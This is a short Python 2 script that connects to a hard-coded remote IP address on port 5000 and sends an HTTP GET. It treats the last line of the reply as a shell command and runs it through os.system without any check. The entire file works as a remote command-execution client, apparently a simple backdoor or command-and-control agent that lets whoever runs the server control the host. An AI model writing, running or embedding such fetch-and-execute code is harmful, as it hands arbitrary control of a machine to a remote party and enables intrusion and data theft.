import socket
import os

HOST = '140.114.71.175'    # The remote host
PORT = 5000                # The same port as used by the server
GET = '/'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send("GET %s HTTP/1.0\r\nHost: %s\r\n\r\n" % (GET, HOST))
data = s.recv(1024)
string = ""

while len(data):
    string = string + data
    data = s.recv(1024)
s.close()

response = string.split('\r\n')
command = response[-1]
print 'Received:', response
print 'Command:', command

print 'Execute %s' % command
os.system(command)
